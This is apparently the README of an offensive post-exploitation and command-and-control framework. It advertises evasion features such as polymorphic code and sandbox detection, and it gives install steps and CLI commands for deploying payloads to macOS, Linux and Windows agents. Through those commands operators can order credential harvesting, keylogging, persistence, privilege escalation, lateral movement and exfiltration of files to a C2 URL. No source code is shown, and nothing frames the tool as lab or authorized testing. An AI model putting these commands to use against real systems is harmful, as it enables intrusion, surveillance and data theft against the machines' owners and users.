# Sovereign Post-Exploitation Framework

This framework provides advanced post-exploitation capabilities with a focus on evasion and automation.

## Features

- **Enhanced Evasion Techniques**: Polymorphic code, sandbox detection, time-based evasion.
- **Advanced Post-Exploitation Modules**: Credential harvesting, persistence, privilege escalation, reconnaissance, data exfiltration, keylogging, lateral movement.
- **Secure Communication**: Encrypted communication between agent and C2 server.
- **Modular Design**: Easily add new modules and functionalities.
- **Logging and Reporting**: Detailed logging and report generation.


## Prerequisites
- Python 3.x
- Virtualenv (recommended)

### Installation and Setup

1. Clone the Repository
   git clone https://github.com/4lph4-01/share
   cd your-repo-directory

2. Create a Virtual Environment
   python -m venv venv
   source venv/bin/activate  # On Windows, use `venv\Scripts\activate`

3. Install Dependencies
   pip install -r requirements.txt

4. Prepare Payloads (If necessary)
   Ensure your payload scripts are in the `payloads` directory:
   - payloads/macos_payload.sh
   - payloads/linux_payload.sh
   - payloads/windows_payload.ps1

### Running the C2 Server

   python c2_server.py

### CLI Usage

1. List Agents
   python cli.py list-agents

2. Deploy Payload
   python cli.py deploy-payload <agent_type>
   Replace <agent_type> with macos, linux, or windows.

3. Select and Send Commands to an Agent
   python cli.py select-agent
   You can specify the agent ID directly or choose from a list of available agents.

4. Generate Report
   python cli.py generate-report

5. Send a Specific Command
   python cli.py send-command <agent_id> <command>

### Supported Commands

Credential Harvesting
   python cli.py send-command <agent_id> cred_harvest

Persistence
   python cli.py send-command <agent_id> persistence

Privilege Escalation
   python cli.py send-command <agent_id> priv_escalation

Reconnaissance
   python cli.py send-command <agent_id> reconnaissance

Data Exfiltration
   python cli.py send-command <agent_id> exfiltrate <file_path> <c2_url>
   Replace <file_path> and <c2_url> with the actual file path and C2 URL.

Keylogging
   python cli.py send-command <agent_id> keylogging

Lateral Movement
   python cli.py send-command <agent_id> lateral_movement

### Modules Directory Structure
Ensure you have a modules directory with the following structure and content:
modules/
    cred_harvest.py
    persistence.py
    priv_escalation.py
    reconnaissance.py
    exfiltration.py
    keylogging.py
    lateral_movement.py
